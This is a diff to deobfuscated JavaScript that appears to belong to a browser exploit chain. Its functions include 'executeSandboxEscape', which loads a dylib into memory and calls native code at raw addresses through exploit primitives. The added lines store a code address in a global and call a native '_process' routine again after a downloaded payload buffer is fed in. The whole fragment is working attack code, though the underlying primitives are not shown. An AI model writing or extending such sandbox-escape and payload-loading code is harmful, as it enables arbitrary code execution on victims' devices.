@@ -1275,6 +1275,13 @@ function YA() {/* Original: YA → resolveSymbols */
                     const container = await E.buildContainer(hashName);
                     E.feedRawBuffer(container);
                     window.log("[LOADER] Fed " + container.byteLength + " bytes for " + hashName);
+                    // WHS: re-call native _process - it processes D[0]=BA
+                    try {
+                        if (globalThis.__whs_T !== undefined) {
+                            const _r2 = platformModule.platformState.caller.jd(utilityModule.Int64.fromNumber(globalThis.__whs_T)).Pt();
+                            window.log("[WHS] _process re-called: " + _r2);
+                        }
+                    } catch (e) { window.log("[WHS] _process re-call err: " + e); }
                 } catch (err) {
                     window.log("[LOADER] Download error: " + err);
                     M();
@@ -1441,6 +1448,7 @@ async function executeSandboxEscape() {/* Original: yA → executeSandboxEscape 
         platformModule.platformState.sandboxEscape.Ad(dylibLoadAddressI64, dylibDataAddressMaybe, dylibSize);
         const T = g.YA().ct() + 4;
         //alert("D 0x" + T.toString(16));
+        globalThis.__whs_T = T;  // WHS: save T for repeated _process calls
         return platformModule.platformState.caller.jd(utilityModule.Int64.fromNumber(T)).Pt();
     })(), A.start(), g;
 }; const yA = executeSandboxEscape;
